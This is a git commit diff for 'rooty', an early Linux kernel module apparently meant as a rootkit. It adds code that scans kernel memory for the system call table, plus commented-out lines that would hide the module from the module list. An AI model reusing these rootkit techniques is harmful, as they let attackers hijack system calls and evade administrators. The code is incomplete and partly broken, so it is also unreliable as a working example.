d95a3d1005976b936908f052916ba12e2c60cce0
blaedj <blaedj@gmail.com>
2014-04-29 15:47:21 -0400

    fix makefile, start finding sys_call_table

--- Makefile
+++ Makefile
@@ -1,7 +1,7 @@
-Obj-m := rooty.o
-KERNEL_DIR = /lib/modules/$(shell uname -r)/build
-PWD = $(shell pwd)
+obj-m += rooty.o
+#KERNEL_DIR = /lib/modules/$(shell uname -r)/build
+#PWD = $(shell pwd)
 all:
-	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
-	rm -rf *.o *.ko *.symvers *.mod.* *.order
+	rm -rf *.o *.ko *.symvers *.mod.* *.order .rooty.*
--- rooty.c
+++ rooty.c
@@ -2,22 +2,56 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 
+#define __NR_close (__NR_SYSCALL_BASE+ 6)
+
+#if defined(__i386__)
+#define START_CHECK 0xc0000000
+#define END_CHECK 0xd0000000
+typedef unsigned int psize;
+#else
+#define START_CHECK 0xffffffff81000000
+#define END_CHECK 0xffffffffa2000000
+typedef unsigned long psize;
+#endif
+
 MODULE_LICENSE("GPL");
-
-int rooty_init(void):
+int rooty_init(void);
 void rooty_exit(void);
-
 module_init(rooty_init);
 module_exit(rooty_exit);
+psize **find(void);
 
+psize *sys_call_table;
 
-int rooty_init()
-{
-  printk("rooty: module loaded\n");
+psize **find(void) {
+  psize **sctable;
+  psize i = START_CHECK;
+  while (i < END_CHECK) {
+    sctable = (psize **) i;
+    if (sctable[__NR_CLOSE] == (psize *) sys_close) {
+      return &sctable[0];
+    }
+    i += sizeof(void *);
+  }
+  return NULL;
 }
 
-
-void rooty_exit()
-{
+int rooty_init(void) {
+  ///Undelete when actually trying to hide rooty---
+  /* list_del_init(&__this_module.list); */
+  /* kobject_del(&THIS_MODULE->mkobj.kobj); */
+  ///----------
   printk("rooty: module loaded\n");
+
+  if(sys_call_table = (psize *) find()) {
+    printk("rooty: sys_call_table found at %p\n", sys_call_table);
+  } else {
+    printk("rooty: sys_call_table not found.\n");
+  }
+
+  return 0;
+}
+
+void rooty_exit(void) {
+  printk("rooty: module removed\n");
 }
